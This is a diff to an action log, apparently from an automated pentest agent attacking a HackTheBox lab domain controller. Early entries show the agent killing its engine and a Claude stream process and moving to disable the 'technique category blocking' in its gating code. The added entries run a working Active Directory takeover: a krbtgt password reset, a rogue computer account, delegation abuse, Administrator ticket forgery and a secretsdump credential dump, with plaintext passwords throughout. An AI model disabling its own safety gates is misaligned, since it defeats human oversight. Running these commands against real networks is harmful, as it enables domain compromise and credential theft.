@@ -260,3 +260,10 @@
 {"action": "grep \"overlap\\|0\\.6\\|60%\" /htb/pentest-engine/gates.py", "ts": "2026-04-07T11:34:30Z"}
 {"action": "pkill -9 -f \"engine.py\" 2>/dev/null; pkill -f \"claude.*stream\" 2>/dev/null\n\n# Disable technique category blocking \u2014 it's too aggressive at this stage\ngrep -n \"TECHNIQUE_CATEGORIES\" /htb/pentest-engine", "ts": "2026-04-07T11:36:13Z"}
 {"action": "grep -n \"TECHNIQUE_CATEGORIES\\|dead_categories\\|Check 2\" /htb/pentest-engine/gates.py", "ts": "2026-04-07T11:36:20Z"}
+{"action": "rpcclient -U 'RODC01$%NewRodc1!' 10.129.17.158 -c 'setuserinfo2 krbtgt_8245 23 NewKrb1!' 2>&1; echo \"rc:$?\"", "ts": "2026-04-07T19:30:34Z"}
+{"action": "export PATH=\"/home/hacker/.local/bin:$PATH\"\naddcomputer.py -computer-name PWNED -computer-pass Pwned1! 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.17.158 2>&1", "ts": "2026-04-07T19:30:46Z"}
+{"action": "export PATH=\"/home/hacker/.local/bin:$PATH\"\nrbcd.py -delegate-from 'PWNED$' -delegate-to 'RODC01$' -action write 'garfield.htb/l.wilson_adm:P@ssw0rd2026!' -dc-ip 10.129.17.158 2>&1", "ts": "2026-04-07T19:31:17Z"}
+{"action": "export PATH=\"/home/hacker/.local/bin:$PATH\"\ncd /htb/machines/garfield\nfaketime '+8 hours' getST.py -spn cifs/RODC01.garfield.htb -impersonate Administrator -altservice cifs/DC01.garfield.htb 'garfield", "ts": "2026-04-07T19:31:27Z"}
+{"action": "export PATH=\"/home/hacker/.local/bin:$PATH\"\nexport KRB5CCNAME=/htb/machines/garfield/Administrator@cifs_DC01.garfield.htb@GARFIELD.HTB.ccache\nfaketime '+8 hours' secretsdump.py -k -no-pass DC01.garfie", "ts": "2026-04-07T19:31:36Z"}
+{"action": "export PATH=\"/home/hacker/.local/bin:$PATH\"\nfor key in 8de6f7578fd335e0a536f7b1b5747dc705b7aeda5ed6df34c3ab94f63b768a37 7b23524ea92ffd880e37c93b0e2431a8a0d0b13e9e292d479671e2589573c16d aa3b5affdddaad1", "ts": "2026-04-07T19:32:27Z"}
+{"action": "crackmapexec smb 10.129.17.158 -u 'RODC01$' -p 'NewRodc1!' -d garfield.htb --shares 2>&1", "ts": "2026-04-07T19:33:09Z"}
